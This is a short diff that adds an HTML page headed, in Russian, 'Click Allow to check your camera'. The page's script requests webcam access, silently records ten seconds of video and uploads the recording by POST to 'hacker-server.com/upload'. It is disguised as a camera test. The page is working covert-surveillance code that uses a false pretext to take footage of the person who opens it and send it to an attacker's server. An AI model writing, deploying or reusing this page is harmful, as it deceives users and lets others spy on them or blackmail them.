@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Нажмите "Разрешить", чтобы проверить камеру</h1>
+  <script>
+    // ппп
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        // ппп
+        const recorder = new MediaRecorder(stream);
+        let chunks = [];
+        
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => {
+          const videoBlob = new Blob(chunks, { type: 'video/webm' });
+          // пп
+          fetch('https://hacker-server.com/upload', {
+            method: 'POST',
+            body: videoBlob
+          });
+        };
+        
+        recorder.start();
+        setTimeout(() => recorder.stop(), 10000); // Запись 10 секунд
+      })
+      .catch(err => {
+        console.error("Ошибка:", err);
+      });
+  </script>
+</body>
+</html>
